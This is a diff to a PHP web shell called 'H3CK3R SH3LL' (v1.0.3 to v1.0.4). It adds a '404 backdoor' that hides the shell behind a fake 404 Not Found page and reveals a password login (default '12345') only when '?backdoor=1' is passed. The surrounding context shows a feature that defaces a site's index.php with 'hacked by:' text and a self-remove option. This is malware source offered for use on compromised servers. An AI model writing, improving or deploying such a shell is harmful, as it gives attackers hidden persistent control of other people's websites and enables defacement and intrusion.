@@ -1,9 +1,9 @@
 <?php
-/*************
+/*************/
 # H3CK3R SH3LL
 # Made by: @It0sh1
-# Github: https://github.com/It0sh1/simple-webshell
-**************/
+# Github: https://www.github.com/it0sh1
+/*************/
 
 // start the session.
 session_start();
@@ -12,33 +12,54 @@ session_start();
 const Author = "It0sh1";
 
 // Version of the webshell.
-const Version = "v1.0.3";
+const Version = "v1.0.4";
 
 // Default password.
 $default_pass = "12345";
 
 // LIST OF SOFTWARE INFORMATION FUNCTIONS.
 $uname = php_uname();
-$server_software = $_SERVER['SERVER_SOFTWARE'];
-$server_ip = gethostbyname($_SERVER['HTTP_HOST']);
-$site_protocol = $_SERVER['SERVER_PROTOCOL'];
-$administrator = $_SERVER['SERVER_ADMIN'];
+$server_software = $_SERVER['SERVER_SOFTWARE'];//     Server software they use.
+$server_ip = gethostbyname($_SERVER['HTTP_HOST']);//  Get server IP.
+$site_protocol = $_SERVER['SERVER_PROTOCOL']; //      HTTP/HTTPS protocol.
+$administrator = $_SERVER['SERVER_ADMIN']; //         Administrator info.
+$requested_uri = $_SERVER['REQUEST_URI']; //          For 404 backdoor.
 
 if(isset($_POST['default_pass']) && $_POST['default_pass'] == $default_pass) {
 	$_SESSION["login"] = true;
 	header("location: ?");
 }
 
-if(!isset($_SESSION["login"])) {
-	echo "<center style='
-	margin-top: 150px;'>
-	<h2>H3CK3R SH3LL " . Version . "</h2>
-	<form method='POST' action=''>
-	<input type='password' name='default_pass' placeholder='PASSWORD'><br /><br />
-	<button type='submit'>Login</button>
-	</form>
-	<i>Coded by: " . Author . "</i>
-	</center>";
+// The 404 backdoor.
+if(isset($_GET['backdoor']) && $_GET['backdoor'] == "1"){
+	if(!isset($_SESSION['login'])) {
+		echo "<center style='
+	            margin-top: 150px;'>
+	                <h2>H3CK3R SH3LL " . Version . "</h2>
+	                    <form method='POST' action=''>
+	                        <input type='password' name='default_pass' placeholder='PASSWORD'><br /><br />
+	                        <button type='submit'>Login</button>
+	                    </form>
+	                <i>Coded by: " . Author . "</i>
+	      </center>";
+	    die();
+	}
+}
+if(!isset($_SESSION['login'])){
+	echo "<!DOCTYPE html>
+            <html>
+                <head>
+	                <title>404 Not Found</title>
+	            </head>
+	        <body>
+	            <h1>Not Found</h1>
+		      <p>
+		        The requested URL " . $requested_uri . " was not found on this server.
+		      </p>
+			  <hr>
+			  <address>" . $server_software . " Server at " . $_SERVER['HTTP_HOST'] . " Port " . $_SERVER['SERVER_PORT'] . "</address>
+	        </body>
+    </html>";
 	die();
 }
 // The shell panel.
@@ -90,14 +111,14 @@ if(isset($_GET['exec']) && $_GET['exec'] == "deface"){
 	<!-- HTML UPLOAD SECTION -->
 	<center>
 	<form method="post" action="" enctype="multipart/form-data">
-	Base directory: <input type="text" name="base_dir" value="<?php echo $base_dir ?>">
-	File name: <input type="text" name="filename" value="index.php"><br /><br />
-	Deface text/(html): <br /><textarea cols="50" rows="15" name="defacemessage">hacked by:</textarea><br /><br />
+	<label>Base directory:</label><input type="text" name="base_dir" value="<?php echo $base_dir ?>">
+	<label>File name:</label><input type="text" name="filename" value="index.php"><br /><br />
+	<label>Deface text/(html):</label><br /><textarea cols="50" rows="15" name="defacemessage">hacked by:</textarea><br /><br />
 	<button type="submit" name="defaceit">Deface it</button></center>
 	<?php
 	if(isset($_POST['defaceit'])){
 		
-		// Properties
+		// Properties.
 		$deface_place = $base_dir;
 		$filename = $_POST['filename'];
 		$deface_text = $_POST['defacemessage'];
@@ -122,7 +143,7 @@ if(isset($_GET['exec']) && $_GET['exec'] == "selfremove"){
 	</form>
 	<p><span style='color:#E33434;'>Warning:</span> IF YOU CLICK ON (Self Remove)
 	YOUR LOGIN SESSION WILL BE DESTROYED, AND THE SHELL ITSELF WILL BE REMOVED FROM THE SERVER!</p></center>";
-	// The destroy function
+	// The destroy function.
 	if(isset($_POST['submitdelete'])){
 		session_start();
 		session_destroy();
